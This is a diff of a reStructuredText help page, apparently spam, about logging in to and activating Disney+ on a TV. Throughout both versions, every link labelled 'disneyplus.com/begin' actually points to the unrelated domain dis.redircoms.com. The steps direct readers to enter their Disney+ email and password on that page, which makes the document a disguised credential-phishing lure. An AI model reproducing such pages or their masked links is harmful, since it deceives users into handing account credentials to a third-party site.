@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Login and Activate Disney Plus on TV?
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
 
 .. image:: blank.png
    :width: 350px
@@ -22,27 +22,17 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+To start streaming Disney+ on your smart TV, you must activate your device using a unique code. Visit `disneyplus.com/begin <https://dis.redircoms.com>`_ and log in with your account to link your TV quickly and securely.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Login and Activate Disney+ on Your TV
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Launch the **Disney+ app** on your Smart TV, Roku, Fire Stick, or Apple TV.
+2. Select **Log In**. A **unique 8-digit activation code** will appear on your screen.
+3. Using a phone or computer, go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
+4. Enter your **Disney+ login credentials** (email and password).
+5. Input the 8-digit code from your TV and click **Continue**.
+6. After successful verification, your TV app will refresh and log in automatically.
 
-**********
-What to Do After Activation
-**********
-
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
-
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+Visit `disneyplus.com/begin <https://dis.redircoms.com>`_ to activate your device and enjoy streaming your favorite shows and movies on Disney+.
